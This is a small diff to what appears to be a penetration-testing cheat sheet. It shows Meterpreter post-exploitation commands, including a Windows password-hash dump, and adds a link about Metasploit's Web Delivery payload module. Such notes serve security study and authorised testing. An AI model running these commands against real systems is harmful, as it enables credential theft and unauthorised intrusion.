@@ -37,4 +37,6 @@ migrate
 ```
 
 Post-exploitation module: `run winenum` script.  
-Windows hashes: `run post/windows/gather/smart_hashdump`
+Windows hashes: `run post/windows/gather/smart_hashdump`  
+
+* [Web Delivery explained](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) //tip: check if there's port added in the payload URL
